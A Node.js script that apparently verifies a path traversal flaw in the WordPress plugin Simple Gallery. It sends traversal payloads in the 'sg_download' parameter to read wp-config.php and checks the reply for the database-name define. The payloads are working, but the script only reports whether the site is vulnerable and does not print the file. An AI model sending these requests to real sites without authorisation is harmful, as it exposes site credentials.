// probe.mjs — exploit-verification probe for Simple Gallery <= 2.0.0
// Path traversal via the unauthenticated `sg_download` query parameter (CVE-2026-90002).
//
// Usage: node probe.mjs <base-url>      e.g. node probe.mjs http://127.0.0.1:8186
// Exit codes:
//   0 = target IS vulnerable (wp-config.php readable via traversal)
//   1 = target is NOT vulnerable (traversal rejected / file not returned)
//   2 = usage or transport error (could not verify either way)
//
// Only sends GET requests to the given base URL. Writes nothing and changes no
// server state, so there is nothing to restore.

const CANDIDATE_TRAVERSALS = [
  // The gallery directory is <ABSPATH>/wp-content/uploads/simple-gallery/,
  // so three levels up reaches the WordPress root where wp-config.php lives.
  '../../../wp-config.php',
  '../../../../wp-config.php',
  '../../../../../wp-config.php',
];

// Marker that only appears in a real wp-config.php file.
const MARKER = /define\(\s*['"]DB_NAME['"]/;

function fail(msg, code = 2) {
  console.error(msg);
  process.exit(code);
}

const arg = process.argv[2];
if (process.argv.length !== 3 || !arg) {
  fail('usage: node probe.mjs <base-url>   (e.g. http://127.0.0.1:8186)');
}

let base;
try {
  base = new URL(arg);
} catch {
  fail(`invalid base URL: ${arg}`);
}
if (base.protocol !== 'http:' && base.protocol !== 'https:') {
  fail(`base URL must be http or https: ${arg}`);
}

async function tryTraversal(payload) {
  // Build the request URL from the validated base only; the payload goes in
  // the query string, so the host and path cannot be changed by it.
  const url = new URL(base.href);
  url.search = '';
  url.hash = '';
  url.searchParams.set('sg_download', payload);

  const res = await fetch(url, { method: 'GET', redirect: 'manual' });
  const body = await res.text();
  const vulnerable = res.status === 200 && MARKER.test(body);
  return { vulnerable, status: res.status, payload };
}

let sawTransportError = false;
let lastStatus = null;

for (const payload of CANDIDATE_TRAVERSALS) {
  try {
    const result = await tryTraversal(payload);
    lastStatus = result.status;
    if (result.vulnerable) {
      console.log(`VULNERABLE: ${base.origin} returned wp-config.php for sg_download=${payload}`);
      process.exit(0);
    }
  } catch (err) {
    sawTransportError = true;
    console.error(`request failed for payload ${payload}: ${err.message}`);
  }
}

if (sawTransportError && lastStatus === null) {
  fail(`NOT VERIFIED: could not reach ${base.origin}`, 2);
}

console.log(`NOT VULNERABLE: traversal to wp-config.php was not returned by ${base.origin} (last HTTP status ${lastStatus})`);
process.exit(1);
